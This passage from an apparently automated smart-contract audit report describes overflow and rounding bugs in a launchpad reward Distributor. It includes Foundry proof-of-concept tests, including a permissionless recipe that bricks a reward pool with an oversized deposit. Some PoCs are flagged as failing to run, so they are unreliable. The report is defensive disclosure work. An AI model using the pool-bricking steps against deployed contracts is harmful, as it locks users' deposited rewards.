
contract RewardDebtOverflowTest is Test {
    Distributor distributor;
    MockToken base;
    MockToken quote;
    address launchpad = address(0xBEEF);
    address user = address(0xA11CE);
    address rewarder = address(0xCAFE);

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(launchpad);

        base = new MockToken("BASE", "B");
        quote = new MockToken("QUOTE", "Q");

        vm.prank(launchpad);
        distributor.createRewardsPair(address(base), address(quote));

        // Single staker with 1 share
        vm.prank(launchpad);
        distributor.increaseStake(address(base), user, 1);
    }

    function testLargeRewardsCauseClaimRevertAfterOverflow() public {
        // Choose D just above 2^96 so that totalAccRewards > 2^96
        uint256 D = (uint256(1) << 96) + 10;

        // Fund and add the huge reward
        base.mint(rewarder, D + 1);
        vm.startPrank(rewarder);
        base.approve(address(distributor), D + 1);
        distributor.addRewards(address(base), address(quote), uint128(D), 0);
        vm.stopPrank();

        // First claim: pays D to the user and truncates rewardDebt to uint96(D)
        vm.prank(user);
        distributor.claimRewards(address(base));

        // Add a tiny extra reward D2 = 1
        vm.startPrank(rewarder);
        distributor.addRewards(address(base), address(quote), 1, 0);
        vm.stopPrank();

        // Second claim: computed baseAmount > totalPendingRewards, so it reverts
        vm.prank(user);
        vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
        distributor.claimRewards(address(base));
    }
}


## Suggested Mitigation
Avoid storing reward debts in a type smaller than the full accumulator range, or enforce safe bounds when casting:

1. Change UserRewardData to use uint256 for baseRewardDebt and quoteRewardDebt, matching the range of totalAccRewards:

    struct UserRewardData {
        uint96 shares;
        uint256 baseRewardDebt;
        uint256 quoteRewardDebt;
    }

   This removes the possibility of overflow at the cost of slightly higher storage.

2. If storage size must be constrained, perform an explicit range check before casting:

    uint256 acc = totalAccRewards(...);
    if (acc > type(uint96).max) revert RewardDebtOverflow();
    userData.baseRewardDebt = uint96(acc);

   and document the effective maximum cumulative reward supported.

3. Alternatively, scale down acc*RewardPerShare over time (e.g., by dividing all per-share and debt values by 2 when they exceed a large threshold) to keep totalAccRewards well within 96 bits. This requires careful rescaling of all related state to preserve correctness.


## [L-7]. Reward debt stored as uint96 without bounds checks can overflow and make claims revert at extreme scales

### Finding Severity Justification: Reward debts are stored as uint96 and are assigned via unchecked downcasts from uint256. If totalAccRewards exceeds 2^96-1, the stored debt truncates, inflating the next claim amount and causing claim/stake/unstake flows to revert against totalPending caps, effectively DoS-ing the user’s rewards. While the logic flaw is real and reproducible, reaching the 96-bit threshold requires astronomically large cumulative rewards per share and is extremely unlikely in realistic deployments. Impact is a user-level claim DoS at extreme scales, with no direct fund theft.
## Derived From Pattern/Invariant
Unchecked uint256→uint96 downcasts in reward debts can corrupt accounting at high scales

## Exploit Type
AccountingInvariantViolation

## Location
RewardsTrackerLib.stake/unstake/claim

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The rewards library stores `baseRewardDebt` and `quoteRewardDebt` as `uint96`, but computes them from a `uint256` without any bounds checks:

Struct:
- `struct UserRewardData { uint96 shares; uint96 baseRewardDebt; uint96 quoteRewardDebt; }`

In `stake` / `unstake`:
- `userData.baseRewardDebt = uint96(totalAccRewards(existingShares + newShares, accBaseRewardsPerShare));`
- `userData.quoteRewardDebt = uint96(totalAccRewards(existingShares + newShares, accQuoteRewardsPerShare));`

In `claim`:
- `uint256 totalAccBaseRewards = totalAccRewards(shares, accBaseRewardsPerShare);`
- `uint256 totalAccQuoteRewards = totalAccRewards(shares, accQuoteRewardsPerShare);`
- `baseAmount = totalAccBaseRewards - uint128(userData.baseRewardDebt);`
- `quoteAmount = totalAccQuoteRewards - uint128(userData.quoteRewardDebt);`
- Then:
  - `userData.baseRewardDebt = uint96(totalAccBaseRewards);`
  - `userData.quoteRewardDebt = uint96(totalAccQuoteRewards);`

`totalAccRewards` is defined as:
- `return (shares * accRewardsPerShare) / PRECISION_FACTOR;`

There is no upper bound on `accRewardsPerShare` or on `shares`, so in principle `totalAccRewards(...)` can grow beyond `2^96 - 1`. When that happens, the cast to `uint96` silently truncates the high bits, storing an incorrect `rewardDebt`.

On the next `claim`, `totalAccBaseRewards` is recomputed as a full `uint256`, while `userData.baseRewardDebt` is read back as the truncated `uint96` and upcast to `uint128`. The computed `baseAmount` / `quoteAmount` becomes:
- `large_totalAcc - truncatedDebt`, which can be **much larger** than the user's true accumulated rewards.

However, the Distributor enforces a global cap via `_decreaseTotalPending`:
- `if (currTotal < amount) revert ClaimAmountExceedsTotalPendingRewards();`

So once `totalAccRewards` overflows 96 bits, any `claimRewards` or stake/unstake that tries to settle rewards for that user will revert with `ClaimAmountExceedsTotalPendingRewards`, effectively freezing their rewards.

While the 96-bit threshold is very high (on the order of 7.9e28 raw units), the code has no check or documentation about this implicit limit. For tokens with large supplies and a very long-running system (especially if base rewards are accumulated at high rate), it is possible in principle for cumulative `accRewardsPerShare` to approach this regime.

## Impact
If cumulative rewards per share ever grow large enough that `totalAccRewards(shares, accRewardsPerShare)` exceeds `2^96 - 1`, downcasting to `uint96` will corrupt `baseRewardDebt`/`quoteRewardDebt`. Subsequent reward claims for that account will either attempt to claim far more than globally pending rewards and revert, or (if the global cap were removed) over-withdraw from the pool. Practically this manifests as a permanent inability for that user to claim further rewards once the system hits this extreme scale.

## Command to Run Test


## Proof of Concept
This PoC artificially constructs the overflowed state to demonstrate the effect on `claimRewards` (without requiring astronomical real deposits):
1. Deploy a custom `DistributorHarness` that exposes functions to directly set `accBaseRewardPerShare`, user shares, and `baseRewardDebt` for a chosen launch asset.
2. Create a pool and initialize a user with 1 share.
3. Manually set `accBaseRewardPerShare` to `(1 << 96) * PRECISION_FACTOR`, so that `totalAccRewards(1, accBaseRewardPerShare) = 2^96`.
4. Ensure `userData.baseRewardDebt` is initially zero, simulating a user who hasn't yet claimed in this high-reward regime.
5. Also set `totalPendingRewards[launchAsset]` to a small value (e.g. 1e18) so the global cap is easily violated.
6. When the user calls `claimRewards(launchAsset)`, the library computes:
   - `totalAccBaseRewards = 2^96`.
   - `baseAmount = 2^96 - 0`.
   - Then attempts `_decreaseTotalPending(launchAsset, 2^96)`.
7. Since `totalPendingRewards[launchAsset]` is far smaller (1e18 in the test), `_decreaseTotalPending` reverts with `ClaimAmountExceedsTotalPendingRewards()`, demonstrating that reward claims are now permanently broken for that user due to the overflowed reward debt.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "../contracts/launchpad/Distributor.sol";
import {RewardsTrackerLib, RewardsTrackerStorage, RewardPoolData, UserRewardData} from "../contracts/launchpad/libraries/RewardsTracker.sol";

contract DistributorHarness is Distributor {
    using RewardsTrackerLib for RewardPoolData;

    function setAccBaseRewardPerShare(address launchAsset, uint256 value) external {
        RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(launchAsset);
        rs.accBaseRewardPerShare = value;
    }

    function setUserShares(address launchAsset, address user, uint96 shares) external {
        RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(launchAsset);
        rs.userRewards[user].shares = shares;
    }

    function setUserBaseRewardDebt(address launchAsset, address user, uint96 debt) external {
        RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(launchAsset);
        rs.userRewards[user].baseRewardDebt = debt;
    }

    function setTotalPending(address asset, uint256 amount) external {
        totalPendingRewards[asset] = amount;
    }
}

contract RewardDebtUint96OverflowTest is Test {
    DistributorHarness internal distributor;
    address internal launchAsset;
    address internal quoteAsset;
    address internal user;

    function setUp() public {
        distributor = new DistributorHarness();
        launchAsset = address(0xA11CE);
        quoteAsset = address(0xBEEF);
        user = address(0x1234);

        distributor.initialize(address(this));
        // Initialize rewards pair so pool exists
        distributor.createRewardsPair(launchAsset, quoteAsset);

        // Give user 1 share
        distributor.setUserShares(launchAsset, user, 1);
    }

    function testClaimRevertsAfterRewardDebtOverflow() public {
        // Construct accBaseRewardPerShare so that totalAccRewards(1, acc) = 2^96
        uint128 PRECISION_FACTOR = 1e12;
        uint256 acc = (uint256(1) << 96) * PRECISION_FACTOR; // accBaseRewardPerShare

        distributor.setAccBaseRewardPerShare(launchAsset, acc);
        distributor.setUserBaseRewardDebt(launchAsset, user, 0);

        // Set global totalPendingRewards for launchAsset to a small value
        distributor.setTotalPending(launchAsset, 1e18);

        // Now when user claims, the library will compute baseAmount ~ 2^96,
        // but _decreaseTotalPending will see currTotal < amount and revert.
        vm.prank(user);
        vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
        distributor.claimRewards(launchAsset);
    }
}


## Suggested Mitigation
Add explicit bounds checks before downcasting reward debts to `uint96` and/or increase the storage width:

1. Easiest fix: store `baseRewardDebt` and `quoteRewardDebt` as full `uint256` values. This removes the risk of overflow at the cost of a small storage increase.

2. If keeping `uint96` is desired, add checks in `stake`, `unstake`, and `claim`:
   - `uint256 newDebt = totalAccRewards(...);`
   - `if (newDebt > type(uint96).max) revert RewardDebtOverflow();`
   - `userData.baseRewardDebt = uint96(newDebt);`

3. Optionally document a hard cap on cumulative rewards per share and enforce it at the protocol level (for example, by limiting the total amount of rewards that can ever be added) so that the system never approaches the overflow threshold.

By ensuring `totalAccRewards` never silently overflows the chosen storage type, you prevent latent states where users' reward claims become permanently impossible due to truncated debts.


## [L-8]. uint96 rewardDebt truncation makes all future claims revert once rewards exceed 2^96−1

### Finding Severity Justification: The bug is real: per-user reward debts are downcast to uint96 without bounds, so once totalAccRewards exceeds 2^96−1 the stored debt truncates, causing subsequent claims to miscompute owed amounts and revert against totalPendingRewards. Impact is a denial of service for future reward claims for affected users/pools. However, the threshold (~7.9e28 base units) is extremely high, and reaching it in production with real assets (e.g., USDC or typical launch tokens) is unlikely. Hence valid but low severity due to impractical amounts required under normal conditions.
## Derived From Pattern/Invariant
Unchecked uint256→uint96 downcasts in reward debts can corrupt accounting at high scales

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.claimRewards (via RewardsTrackerLib.stake/unstake/claim)

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
RewardsTrackerLib stores per-user reward debts (baseRewardDebt and quoteRewardDebt) as uint96 but assigns them from potentially unbounded uint256 values without any range checks:
```solidity
struct UserRewardData {
    uint96 shares;
    uint96 baseRewardDebt;
    uint96 quoteRewardDebt;
}

function stake(RewardPoolData storage self, address user, uint96 newShares)
    internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    ...
    userData.baseRewardDebt = uint96(totalAccRewards(existingShares + newShares, accBaseRewardsPerShare));
    userData.quoteRewardDebt = uint96(totalAccRewards(existingShares + newShares, accQuoteRewardsPerShare));
}

function unstake(RewardPoolData storage self, address user, uint96 removeShares)
    internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    ...
    userData.baseRewardDebt = uint96(totalAccRewards(existingShares - removeShares, accBaseRewardsPerShare));
    userData.quoteRewardDebt = uint96(totalAccRewards(existingShares - removeShares, accQuoteRewardsPerShare));
}

function claim(RewardPoolData storage self, address user)
    internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    ...
    uint256 totalAccBaseRewards = totalAccRewards(shares, accBaseRewardsPerShare);
    uint256 totalAccQuoteRewards = totalAccRewards(shares, accQuoteRewardsPerShare);

    baseAmount = totalAccBaseRewards - uint128(userData.baseRewardDebt);
    quoteAmount = totalAccQuoteRewards - uint128(userData.quoteRewardDebt);

    // Update reward debts
    userData.baseRewardDebt = uint96(totalAccBaseRewards);
    userData.quoteRewardDebt = uint96(totalAccQuoteRewards);
}
```
As accBaseRewardPerShare grows over time (many reward additions, high token amounts) and/or shares are large, totalAccRewards(shares, accBaseRewardPerShare) can legitimately exceed 2^96−1. When that happens, the cast to uint96 silently truncates the high bits of totalAccRewards.

Consider a user with 1 share, and a very large reward deposit D where D > 2^96−1. With totalShares = 1, after update() we get:
- accBaseRewardPerShare = D * PRECISION_FACTOR.
- totalAccBaseRewards = totalAccRewards(1, accBaseRewardPerShare) = D.
- baseAmount in claim() = D - baseRewardDebt (which was 0) = D, so the first claim pays out D and sets baseRewardDebt = uint96(D), which wraps modulo 2^96.
Assume D = type(uint96).max + 1, so baseRewardDebt becomes 0.

Now if an additional small reward of 1 token is added and the user claims again:
- totalAccBaseRewards becomes D + 1.
- baseAmount is computed as (D + 1) - baseRewardDebt, but baseRewardDebt is still 0 due to truncation, so baseAmount = D + 1.
- Distributor._decreaseTotalPending is called with amount = D + 1, but totalPendingRewards[asset] only increased by 1 for the second deposit (the first was already paid out), so currTotal < amount and ClaimAmountExceedsTotalPendingRewards is thrown.

This means:
- Once cumulative per-share rewards for a user exceed the 96-bit range, their rewardDebt wraps and any subsequent claim that includes additional rewards will attempt to claim more than has been recorded as totalPendingRewards.
- The global guard in _decreaseTotalPending detects this and reverts, causing all future claims for that user (and potentially others) to fail.
- Because the revert happens after RewardsTrackerLib.claim has updated reward debts in memory but before state is committed, the system is stuck: later attempts to claim will continue to revert as long as new rewards are added.

While the threshold 2^96−1 is high, it is reachable within the designed uint128 pendingRewards and uint96 shares ranges and large-token environments. The code has no safeguards or documentation enforcing a safe upper bound, so this latent overflow can eventually freeze rewards in long-lived deployments or tokens with very large units.

## Impact
When a user’s cumulative totalAccRewards exceeds 2^96−1, their stored rewardDebt truncates on the uint96 cast. From that point on, their subsequent claims calculate an owed amount that can exceed the pool’s totalPendingRewards, causing their claim to revert with ClaimAmountExceedsTotalPendingRewards. This creates a persistent denial of service for that user’s future claims (until massive new rewards accumulate to cover the inflated owed amount). Other users remain unaffected unless their own cumulative rewards also overflow the 96-bit range.

## Command to Run Test


## Proof of Concept
1) Create rewards pair and grant a staker 1 share via increaseStake.
2) Add a very large base reward D = 2^96 (i.e., type(uint96).max + 1).
3) The staker claims: baseAmount = D (since prior debt was 0). After the claim, baseRewardDebt is set to uint96(D) = 0 due to truncation.
4) Add a small additional reward of 1.
5) On the next claim, the library computes baseAmount = (D + 1) − baseRewardDebt = (D + 1) − 0 = D + 1. Distributor._decreaseTotalPending(base, D + 1) compares against totalPendingRewards[base] == 1 (only the second deposit is pending), so it reverts with ClaimAmountExceedsTotalPendingRewards.
Notes: The revert rolls back in-tx storage writes (including any intermediate rewardDebt updates). However, the user’s last successful claim already stored a truncated rewardDebt, so every future claim continues to revert as more small rewards are added, causing a persistent DoS for that user.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "../contracts/launchpad/Distributor.sol";

contract MockERC20Overflow {
    string public name = "Mock";
    string public symbol = "MOCK";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }
}

contract DistributorRewardDebtOverflowTest is Test {
    Distributor distributor;
    MockERC20Overflow base;
    MockERC20Overflow quote;

    address launchpad = address(0xBEEF);
    address staker = address(0xCAFE);
    address rewarder = address(0x1234);

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(launchpad);

        base = new MockERC20Overflow();
        quote = new MockERC20Overflow();

        vm.prank(launchpad);
        distributor.createRewardsPair(address(base), address(quote));

        // one staker with one share
        vm.prank(launchpad);
        distributor.increaseStake(address(base), staker, 1);
    }

    function testRewardDebtOverflowBlocksFutureClaims() public {
        // large reward just above uint96 max
        uint128 largeReward = uint128(uint256(type(uint96).max) + 1);

        // fund and add the large reward
        base.mint(rewarder, uint256(largeReward) + 2);
        vm.startPrank(rewarder);
        base.approve(address(distributor), type(uint256).max);
        distributor.addRewards(address(base), address(quote), largeReward, 0);
        vm.stopPrank();

        // first claim pays out the large reward successfully
        vm.prank(staker);
        distributor.claimRewards(address(base));
        assertEq(base.balanceOf(staker), largeReward);

        // add a small additional reward
        vm.startPrank(rewarder);
        base.approve(address(distributor), type(uint256).max);
        distributor.addRewards(address(base), address(quote), 1, 0);
        vm.stopPrank();

        // second claim reverts because rewardDebt was truncated to uint96
        vm.prank(staker);
        vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
        distributor.claimRewards(address(base));
    }
}


## Suggested Mitigation
Eliminate lossy downcasts of rewardDebt. Store baseRewardDebt and quoteRewardDebt as uint256 (or at least uint128) and compute with full-width arithmetic. Also remove the uint128 casts in claim/pending calculations:
- struct UserRewardData { uint96 shares; uint256 baseRewardDebt; uint256 quoteRewardDebt; }
- In stake/unstake/claim: assign rewardDebt directly from totalAccRewards(...) without casting; subtract using uint256.
If storage size is a hard constraint, add explicit range checks before casting to a smaller type and revert on overflow (e.g., RewardDebtOverflow) and/or introduce a global offset checkpointing scheme to keep per-user cumulative totals below the chosen bit width, with clear documented bounds.





 **Derived From** : Large reward balances can overflow PRECISION math and brick rewards pool

## [M-9]. RewardsTrackerLib PRECISION_FACTOR multiplication can overflow and permanently brick a rewards pool

### Finding Severity Justification: pending{Base,Quote}Rewards (uint128) are multiplied by PRECISION_FACTOR (uint128 = 1e12) inside getAccRewardsPerShare without widening to 256 bits. In Solidity 0.8+, uint128 * uint128 overflows and reverts before division if pending rewards exceed ~type(uint128).max / 1e12 ≈ 3.4e26 (base units). Once exceeded, every path that calls getAccRewardsPerShare (stake, unstake, claim, update, getPendingRewards) reverts, causing a persistent DoS for the rewards pool and locking already-deposited rewards in Distributor. This impacts protocol functionality/availability but does not directly steal assets, hence Medium.
## Derived From Pattern/Invariant
Large reward balances can overflow PRECISION math and brick rewards pool

## Exploit Type
AccountingInvariantViolation

## Location
RewardsTrackerLib.getAccRewardsPerShare

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In the rewards distribution library, `pendingBaseRewards` and `pendingQuoteRewards` are stored as `uint128` and multiplied by a large precision factor `PRECISION_FACTOR = 1e12` while still in the 128-bit domain:

`uint128 public constant PRECISION_FACTOR = 1e12;`

`function getAccRewardsPerShare(RewardPoolData storage self) internal view returns (uint256 accBaseRewardsPerShare, uint256 accQuoteRewardsPerShare) {
    uint96 totalShares = self.totalShares;
    if (totalShares == 0) return (self.accBaseRewardPerShare, self.accQuoteRewardPerShare);

    accBaseRewardsPerShare = self.accBaseRewardPerShare;
    accQuoteRewardsPerShare = self.accQuoteRewardPerShare;

    if (self.pendingBaseRewards > 0) {
        accBaseRewardsPerShare += ((self.pendingBaseRewards * PRECISION_FACTOR) / uint128(totalShares));
    }

    if (self.pendingQuoteRewards > 0) {
        accQuoteRewardsPerShare += ((self.pendingQuoteRewards * PRECISION_FACTOR) / uint128(totalShares));
    }
}`

Because both `pending*Rewards` and `PRECISION_FACTOR` are `uint128`, the products `self.pendingBaseRewards * PRECISION_FACTOR` and `self.pendingQuoteRewards * PRECISION_FACTOR` are computed as `uint128`. In Solidity 0.8, this multiplication reverts on overflow *before* the division.

If `pending{Base,Quote}Rewards` exceed roughly `type(uint128).max / 1e12 ≈ 3.4e26`, the multiplication overflows and every call to `getAccRewardsPerShare` reverts. This function is used by:
- `RewardsTrackerLib.update()` and transitively
- `stake()`, `unstake()`, `claim()` and `getPendingRewards()` in `Distributor`.

`Distributor.addRewards` is permissionless and increments these fields with attacker-controlled amounts:

`function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
    ...
    if (launchAssetAmount > 0) {
        rs.addBaseRewards(launchAsset, launchAssetAmount); // pendingBaseRewards += amount
        _increaseTotalPending(launchAsset, launchAssetAmount);
        launchAsset.safeTransferFrom(msg.sender, address(this), uint256(launchAssetAmount));
    }
    ...
}`

There is no upper bound beyond the implicit `uint128` limit, so a malicious or careless user can push `pendingBaseRewards` or `pendingQuoteRewards` into the overflow region (e.g. by depositing an extremely large reward for a high-supply token). The `addRewards` call itself succeeds, but **all subsequent operations that touch this rewards pool revert**, including staking, unstaking, claiming, and even `getPendingRewards`.

Once in this state, there is no on-chain mechanism to reduce `pending*Rewards` and restore functionality; the rewards pool for that asset is effectively bricked.

## Impact
When pendingBaseRewards or pendingQuoteRewards exceed roughly type(uint128).max / 1e12 ≈ 3.4e26 base units (≈ 3.4e8 tokens for 18-decimals), the uint128×uint128 multiplication in getAccRewardsPerShare overflows and reverts. Thereafter, every call path that touches rewards accounting (getPendingRewards, update, stake, unstake, claim) reverts, bricking the pool. Because addRewards is permissionless, any user can push the pool into this state. All rewards already deposited into Distributor for that pool become stuck indefinitely (no mechanism exists to reduce pending*Rewards), resulting in a persistent DoS and loss of functionality for affected users and the protocol.

## Command to Run Test


## Proof of Concept
Reproduction steps (permissionless path):
1) Set up a rewards pool with non-zero shares (normal launch flow does this; alternatively via launchpad calling Distributor.increaseStake during bonding).
2) Compute threshold = floor(type(uint128).max / PRECISION_FACTOR) where PRECISION_FACTOR = 1e12.
3) Call Distributor.addRewards(token0, token1, amount0, amount1) such that the pool’s pendingBaseRewards or pendingQuoteRewards becomes threshold + 1 (approve and transfer sufficient tokens to Distributor; addRewards is permissionless but requires totalShares > 0).
4) Any subsequent interaction that uses rewards accounting (e.g., Distributor.getPendingRewards, Distributor.claimRewards, or launchpad-driven stake/unstake) will revert because getAccRewardsPerShare attempts a uint128×uint128 multiply that overflows before the division.
5) There is no on-chain method to decrement pending*Rewards, so the pool remains permanently bricked and the deposited rewards are stuck.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {RewardsTrackerLib, RewardPoolData} from "contracts/launchpad/libraries/RewardsTracker.sol";

contract RewardsOverflowHarness {
    using RewardsTrackerLib for RewardPoolData;
    RewardPoolData internal pool;

    function setTotalShares(uint96 shares) external {
        pool.totalShares = shares;
    }

    function addPendingBase(uint128 amount) external {
        pool.pendingBaseRewards += amount;
    }

    function getAcc() external view returns (uint256, uint256) {
        return pool.getAccRewardsPerShare();
    }

    function triggerUpdate() external returns (uint256, uint256) {
        return pool.update();
    }

    function stakeWrap(address user, uint96 shares) external returns (uint256, uint256) {
        return pool.stake(user, shares);
    }
}

contract RewardsPrecisionOverflowTest is Test {
    RewardsOverflowHarness h;

    function setUp() public {
        h = new RewardsOverflowHarness();
    }

    function test_pendingRewards_overflow_bricks_pool() public {
        // Ensure non-zero shares so the math path executes
        h.setTotalShares(1);

        uint128 max128 = type(uint128).max;
        uint128 factor = 1e12; // PRECISION_FACTOR
        uint128 threshold = max128 / factor;

        // Push pending above safe threshold so (pending * PRECISION_FACTOR) overflows uint128
        h.addPendingBase(threshold + 1);

        // All entry points that compute acc rewards per share will revert
        vm.expectRevert();
        h.getAcc();

        vm.expectRevert();
        h.triggerUpdate();

        vm.expectRevert();
        h.stakeWrap(address(1), 1);
    }
}


## Suggested Mitigation
Perform the multiplication in 256-bit space before division. Either widen operands explicitly or make PRECISION_FACTOR a uint256 constant. Example fix inside RewardsTrackerLib.getAccRewardsPerShare:

if (self.pendingBaseRewards > 0) {
    accBaseRewardsPerShare += (uint256(self.pendingBaseRewards) * uint256(PRECISION_FACTOR)) / uint256(totalShares);
}
if (self.pendingQuoteRewards > 0) {
    accQuoteRewardsPerShare += (uint256(self.pendingQuoteRewards) * uint256(PRECISION_FACTOR)) / uint256(totalShares);
}

Additionally, consider declaring: uint256 public constant PRECISION_FACTOR = 1e12; so future math using it defaults to 256-bit operations. As a defense-in-depth alternative (not required if widening is applied), cap addRewards so that pending*PRECISION_FACTOR cannot overflow 256-bit math; revert when adding rewards would exceed a safe bound.





 **Derived From** : Rounding in rewards index vs totalPendingRewards causes permanently locked reward dust

## [L-10]. Rounding in rewards indices vs totalPendingRewards permanently locks dust rewards in Distributor

### Finding Severity Justification: Rounding during reward index updates creates unclaimable dust that accumulates in the Distributor. This does not enable theft or loss of significant user funds, but it can permanently lock small token amounts over time and prevents admin from skimming them due to the totalPendingRewards guard. Impact is limited to dust-level leakage of rewards effectiveness.
## Derived From Pattern/Invariant
Rounding in rewards index vs totalPendingRewards causes permanently locked reward dust

## Exploit Type
RoundingError

## Location
Distributor.skimExcessRewards

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The rewards system tracks per-pool and global reward accounting using separate variables:

- Per-pool: `RewardPoolData.pendingBaseRewards`, `pendingQuoteRewards`, and `acc*RewardPerShare` via `RewardsTrackerLib`.
- Global per-asset: `Distributor.totalPendingRewards[asset]`, updated in `_increaseTotalPending` / `_decreaseTotalPending` and used to bound `skimExcessRewards`.

When rewards are added via `Distributor.addRewards`:

`rs.addBaseRewards(launchAsset, launchAssetAmount); // pendingBaseRewards += amount`
`_increaseTotalPending(launchAsset, launchAssetAmount); // totalPendingRewards[asset] += amount`

`RewardsTrackerLib.update()` later converts each pool's `pending*Rewards` into per-share indices and zeroes the pending fields:

`function update(RewardPoolData storage self) internal returns (uint256 newAccBaseRewardsPerShare, uint256 newAccQuoteRewardsPerShare) {
    (newAccBaseRewardsPerShare, newAccQuoteRewardsPerShare) = getAccRewardsPerShare(self);

    if (self.pendingBaseRewards > 0) {
        self.accBaseRewardPerShare = newAccBaseRewardsPerShare;
        delete self.pendingBaseRewards;
    }

    if (self.pendingQuoteRewards > 0) {
        self.accQuoteRewardPerShare = newAccQuoteRewardsPerShare;
        delete self.pendingQuoteRewards;
    }
}`

`getAccRewardsPerShare` uses integer division to spread pending rewards over the shares:

`if (self.pendingBaseRewards > 0) {
    accBaseRewardsPerShare += ((self.pendingBaseRewards * PRECISION_FACTOR) / uint128(totalShares));
}`

This floor-division means that, for each update, there can be a non-zero remainder (`pending % totalShares` in token units) that is **never reflected in `acc*RewardPerShare`**. After `update()`, `pendingBaseRewards` is set to zero and the remainder is effectively dropped at the pool level.

However, `Distributor.totalPendingRewards[asset]` is **not** adjusted in `update()`; it is only decreased when actual transfers are made in `_distributeAssets`:

`function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
    if (baseAmount > 0) {
        _decreaseTotalPending(base, baseAmount); // totalPendingRewards[base] -= baseAmount
        base.safeTransfer(msg.sender, baseAmount);
    }
    ...
}`

Therefore:
- The sum of all user claims from a reward deposit is strictly less than the original amount due to rounding in `getAccRewardsPerShare`.
- The "dust" portion is left as actual token balance in the Distributor, but `totalPendingRewards[asset]` is only reduced by the claimed amounts. At the end of a full round of claims, `totalPendingRewards[asset]` equals the accumulated dust, even though users can no longer claim it (`pending*Rewards` and reward debts have been updated to ignore it).

The admin function `skimExcessRewards` uses `totalPendingRewards` to limit how much can be withdrawn as excess:

`function skimExcessRewards(address asset, uint256 amount) external onlyOwnerOrRoles(ADMIN_ROLE) {
    if (amount > asset.balanceOf(address(this)) - totalPendingRewards[asset]) revert SkimOverflow();
    asset.safeTransfer(msg.sender, amount);
}`

Since `asset.balanceOf(this) - totalPendingRewards[asset]` is zero when all unclaimed tokens are dust tracked in `totalPendingRewards`, `skimExcessRewards` cannot withdraw these leftover tokens either. The dust becomes permanently locked in the Distributor contract.

## Impact
Over many reward epochs, small rounding remainders accumulate as unclaimable dust per asset. Neither users (because pending rewards and reward debts have been updated to exclude the dust) nor the admin (because `skimExcessRewards` is bounded by `totalPendingRewards`) can ever withdraw this dust. This leads to a growing amount of locked tokens in the Distributor contract, reducing the effective value of rewards added to the system.

## Command to Run Test


## Proof of Concept
Revised PoC (high-level steps)
1) Initialize Distributor with launchpad = test contract, deploy two ERC20s (base, quote).
2) Launchpad creates rewards pair for (base, quote).
3) Launchpad grants a single staker 3 shares via increaseStake(base, staker, 3). Now totalShares = 3 (all held by the staker).
4) A rewards provider adds exactly 10 base tokens to the Distributor for this pool.
5) The staker calls claimRewards(base). Due to floor division in getAccRewardsPerShare ((pending * 1e12) / totalShares), with pending=10e18 and totalShares=3, acc increase is floor(1e31/3). Multiplying back by shares and dividing by 1e12 yields 10e18 - 1 wei, so the staker receives 10e18 - 1 and 1 wei remains in the Distributor.
6) totalPendingRewards[base] is decreased only by the claimed amount (10e18 - 1), leaving totalPendingRewards[base] == 1.
7) The Distributor holds exactly 1 wei of base token and totalPendingRewards[base] == 1. No user has any pending rewards (getPendingRewards == 0).
8) Admin attempts skimExcessRewards(base, 1) and it reverts, because balanceOf(this) - totalPendingRewards[base] == 0. The 1 wei is permanently locked.

## Proof of Code
import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract TestERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

